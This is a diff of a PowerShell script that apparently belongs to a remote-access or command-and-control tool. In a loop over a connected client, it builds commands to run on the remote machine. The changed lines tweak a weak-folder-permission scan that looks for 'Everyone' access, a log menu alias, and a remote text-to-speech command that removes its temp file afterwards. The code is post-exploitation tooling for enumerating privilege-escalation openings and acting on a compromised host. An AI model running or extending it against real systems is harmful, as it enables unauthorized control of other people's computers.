@@ -466,7 +466,7 @@ While($Client.Connected)
           write-host " - Input Remote Folder Path (`$env:tmp): " -NoNewline;
           $RfPath = Read-Host;Write-Host "`n`n";
           #$Command = "cd $final_path;cmd /c `"FOR /f `"tokens=*`" %G IN ('dir /A:D /b /s') DO cmd /c icacls `"%G`"|findstr /i `"Everyone`" `>`> %tmp%\WeakPrivs.txt`";Get-Content `$env:tmp\WeakPrivs.txt;Remove-Item `$env:tmp\WeakPrivs.txt -Force";
-          $Command = "icacls `"$RfPath\*`"|findstr `"Everyone`" `> WeakFP.txt;`$a = Get-Content WeakFP.txt|findstr `"Everyone`";If(`$a){Get-Content WeakFP.txt;remove-item WeakFP.txt -Force}else{echo `"   None Weak Folder Permissions Found ..`" `> WeakFP.txt;Get-Content WeakFP.txt;remove-item WeakFP.txt -Force}";
+          $Command = "icacls `"$RfPath\*`"|findstr `"Everyone`" `> WeakFP.txt;`$a = Get-Content WeakFP.txt|findstr `"Everyone`";If(`$a){Get-Content WeakFP.txt;remove-item WeakFP.txt -Force}else{echo `"   None Weak Folder Permissions Found (Everyone (I) (F) (W)) ..`" `> WeakFP.txt;Get-Content WeakFP.txt;remove-item WeakFP.txt -Force}";
         }
         If($my_choise -eq "Service" -or $my_choise -eq "service")
         {
@@ -889,7 +889,7 @@ While($Client.Connected)
         $shutdown_msg = $Null;
         $shutdown_time = $Null;
       }
-      If($choise -eq "ListLog" -or $choise -eq "log")
+      If($choise -eq "ListLog" -or $choise -eq "logs")
       {
         write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
         write-host "   -------   -----------                     ------";
@@ -947,7 +947,7 @@ While($Client.Connected)
         If(-not ($MYSpeak -eq $False -or $MYSpeak -eq ""))
         {
           write-host "`n";
-          $Command = "`$My_Line = `"$MYSpeak`";Add-Type -AssemblyName System.speech;`$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;`$speak.Volume = 85;`$speak.Rate = -1;`$speak.Speak(`$My_Line);echo `"   [OK] Speak Frase: '$MYSpeak' Remotely ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
+          $Command = "`$My_Line = `"$MYSpeak`";Add-Type -AssemblyName System.speech;`$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;`$speak.Volume = 85;`$speak.Rate = -2;`$speak.Speak(`$My_Line);echo `"   [OK] Speak Frase: '$MYSpeak' Remotely ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
         }else{
           write-host "`n`n";
           write-host " [ERROR] Abort, None Frase Inputed by User .." -ForegroundColor Red -BackgroundColor White;write-host "`n";Start-Sleep -Seconds 3;
